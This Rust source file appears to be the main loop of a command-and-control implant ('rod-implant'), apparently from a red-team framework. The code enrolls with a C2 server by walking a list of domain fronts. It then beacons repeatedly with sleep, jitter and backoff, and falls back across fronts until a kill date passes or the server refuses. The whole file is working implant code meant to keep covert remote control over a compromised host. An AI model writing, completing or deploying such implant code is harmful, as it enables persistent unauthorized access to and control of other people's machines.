use std::sync::{Arc, Mutex};

use crate::enroll::{self, Enrollment};
use crate::handlers::Cadence;
use crate::profile::Profile;
use crate::session::{Attempt, Seal, Session};
use crate::transport::{beacon_url, carriage_for};

/// The run's end states, mapped to process exits.
pub enum Exit {
    /// The artifact's time fuse or the server's permanent answer: stop.
    Terminated(u8),
    /// Nothing answered the enrollment walk.
    NoFront,
}

/// One complete run: enroll once (walking the fronts), then hold contacts
/// against the beacon URLs the same fronts name, reconnecting and walking
/// on failure, until the kill date or a permanent refusal. The nonce floor,
/// the ledger, and the cadence live in the session and survive every
/// reconnect and walk step.
pub fn run(profile: &Profile) -> Exit {
    let keys = enroll::KeyPair::generate();

    // The enrollment walk (architecture.md Sec 8): a transport failure
    // walks to the next front (the credential is unspent against a server
    // that never answered); a definitive refusal ends the run.
    let fronts = profile.enroll_walk();
    let mut enrollment: Option<Enrollment> = None;
    let mut last_error = String::new();
    for url in &fronts {
        match enroll::enroll(url, profile, &keys) {
            Ok(done) => {
                enrollment = Some(done);
                break;
            }
            Err(cause)
                if cause.starts_with("enroll transport") || cause.starts_with("enroll read") =>
            {
                last_error = cause;
            }
            Err(refusal) => {
                eprintln!("rod-implant: {refusal}");
                return Exit::Terminated(1);
            }
        }
    }
    let Some(enrollment) = enrollment else {
        eprintln!("rod-implant: no enroll front answered ({last_error})");
        return Exit::NoFront;
    };
    eprintln!(
        "rod-implant: enrolled {} into engagement {}",
        enrollment.implant_id, enrollment.engagement_id
    );

    let cadence: Cadence = Arc::new(Mutex::new((profile.sleep_seconds, profile.jitter_seconds)));
    let mut session = Session::new(
        enrollment.implant_id,
        &profile.verbs,
        cadence,
        enrollment.ca_chain,
        Seal::parse(&profile.envelope_key).filter(|_| profile.contact_envelope == "aesgcm"),
        profile.kill_date.clone(),
        profile.mode != "stream",
    );
    let mut carriage = carriage_for(profile);

    // Contacts never re-enroll: the artifact's identity is bound, and the
    // walk only crosses fronts. A named beacon front (the split-socket
    // shape) leads the walk; the fallback fronts follow as derived contacts.
    let mut walk: Vec<String> = Vec::new();
    if !profile.beacon_url.is_empty() {
        walk.push(profile.beacon_url.clone());
    }
    for url in &fronts {
        walk.push(beacon_url(url));
    }
    let mut index = 0usize;
    let mut failures = 0u32;
    loop {
        if session.kill_date_passed() || profile.kill_date_passed() {
            return Exit::Terminated(0);
        }
        let url = &walk[index % walk.len()];
        if !carriage.serves(url, &profile.mode) {
            // The walk stepped onto a URL shape this build's carriage does
            // not dial (an mTLS front on a poll-only build, say): walk on
            // rather than dialing something we cannot serve.
            index += 1;
            continue;
        }
        match carriage.attempt(&mut session) {
            Ok(Attempt::Crossed) => failures = 0,
            Ok(Attempt::Refused) => {
                eprintln!("rod-implant: the server refused the handshake; terminating");
                return Exit::Terminated(0);
            }
            Err(cause) => {
                eprintln!("rod-implant: contact ended: {cause}");
                index += 1;
                failures += 1;
            }
        }
        session.backoff_sleep(failures);
    }
}
